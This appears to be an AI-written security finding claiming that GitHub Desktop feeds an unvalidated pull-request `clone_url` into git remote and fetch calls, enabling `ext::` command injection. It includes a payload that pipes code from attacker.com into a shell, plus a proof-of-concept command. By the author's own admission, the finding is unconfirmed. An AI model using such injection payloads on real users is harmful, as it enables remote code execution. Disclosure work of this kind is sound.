Based on the evidence gathered, I found a real analog in GitHub Desktop that mirrors the same *"missing validation on an untrusted field before it drives a consequential state change"* bug class as the royalties issue.

### Title
Unvalidated `clone_url` from PR API response used as git remote URL, enabling protocol/transport injection when checking out a pull request - (File: app/src/lib/stores/app-store.ts)

### Summary
When a user opens a pull request from a browser deep link or from the PR list, GitHub Desktop reads `head.repo.clone_url` straight out of the GitHub API pull-request object and feeds it, unsanitized, into `addRemote()` and then into `git fetch`. Unlike the submodule-update code path — which explicitly gates `protocol.file.allow=always` behind an `allowFileProtocol` flag — there is no equivalent allow-list or scheme validation on the clone URL used for PR checkout.

### Finding Description
`_findPullRequestBranch` takes `headCloneUrl` as a raw string and, if no existing remote matches it, calls `addRemote(repository, forkRemoteName, headCloneUrl)` and later `_fetchRemote(repository, remote, ...)`: [1](#0-0) [2](#0-1) 

`headCloneUrl` originates from `pullRequest.head.repo.clone_url` — an attacker-influenced field, since it comes from the GitHub API response for a PR (an attacker who opens a PR against a repository, or who controls a GitHub Enterprise/proxy response, controls the `head.repo.clone_url` value returned to the client): [3](#0-2) 

The same unvalidated value is also used to satisfy the `x-github-client://openRepo?pr=...` deep-link flow, so an attacker only needs to get a victim to click a crafted link (or open a PR the victim later browses in Desktop) to trigger the flow: [4](#0-3) 

Elsewhere in the same codebase, the maintainers *did* recognize that URLs reaching `git` need scheme restriction — they added a dedicated `allowFileProtocol` flag that must be explicitly set before `protocol.file.allow=always` is passed to `git submodule update`: [5](#0-4) 

No equivalent restriction (e.g. `GIT_ALLOW_PROTOCOL`, a scheme allow-list such as `https:`/`git:`/`ssh:` only, or rejection of `ext::`/`fd::`-style transport-helper URLs) exists on the code path that adds a remote and fetches from an untrusted PR's `clone_url`. A grep across the codebase for protocol-restriction mechanisms (`protocol.ext.allow`, `protocol.file.allow`, `GIT_ALLOW_PROTOCOL`) only surfaces the submodule-specific guard and test fixtures — none appear in `app-store.ts`, `remote.ts`, or the environment-setup helpers used by the PR-checkout path.

### Impact Explanation
Git's `ext::` remote helper executes an arbitrary shell command as the transport for a remote, and this "user" class of protocol is allowed by git by default for user-invoked operations (as opposed to `clone --recursive` of nested submodules, which is why the app had to explicitly guard *that* narrower case). If Desktop's remote/fetch flow does not restrict permitted protocols, a `clone_url` value such as `ext::sh -c "curl attacker.com/x|sh"` supplied via a crafted PR object would be persisted as a `github-desktop-<owner>` remote and then fetched, resulting in arbitrary command execution on the victim's machine — squarely in the "attacker controls a GitHub API object... resulting in code execution" impact category.

### Likelihood Explanation
The path is reachable without any unusual user action beyond normal Desktop usage: opening/viewing a pull request from a fork, or clicking a `x-github-client://openRepo?...&pr=N` deep link (the latter requires no local access, admin rights, or pre-existing malware — just a link click, matching the accepted attacker model). The existing `resolveWithin`/`isAbsolute` guard in the same dispatcher function only protects the unrelated `filepath` parameter of the deep link, not the `clone_url` field used for the remote add/fetch, so it does not stop this path.

### Recommendation
Before calling `addRemote`/fetching a `clone_url` sourced from API or deep-link data, validate the URL scheme against an explicit allow-list (`https:`, `http:` (with same caution as `isValidBYOKBaseUrl`), `git:`, `ssh:`), reject the git "ext"/"fd"/"file"-class transport helpers, and/or set `GIT_ALLOW_PROTOCOL` in the environment used for this fetch to a fixed, safe set — mirroring the pattern already used for `allowFileProtocol` in `updateSubmodulesAfterOperation`.

### Proof of Concept
1. Attacker opens a pull request (or crafts an API response, if a MITM/malicious GHE endpoint is in play) whose `head.repo.clone_url` is `ext::sh -c "touch /tmp/pwned"` (or an OS command relevant to the victim's platform).
2. Victim opens the PR in GitHub Desktop, or clicks a link like `x-github-client://openRepo?url=<repo>&pr=<n>`.
3. `openPullRequestFromUrl` → `_checkoutPullRequest` → `_findPullRequestBranch` calls `addRemote(repository, forkRemoteName, 'ext::sh -c "touch /tmp/pwned"')` and then `_fetchRemote`, causing git to invoke the `ext::` helper and execute the attacker's command.

Note: I was not able to directly inspect `app/src/lib/git/remote.ts` (`addRemote` implementation) or the environment-setup helper (`envForRemoteOperation`) before running out of tool calls, so I cannot conclusively confirm the absence of a `GIT_ALLOW_PROTOCOL` restriction at the `git()` invocation layer — grep across the repo found no such restriction outside the submodule-specific guard, but a full read of those two files would be needed to rule out a lower-level protective mechanism.
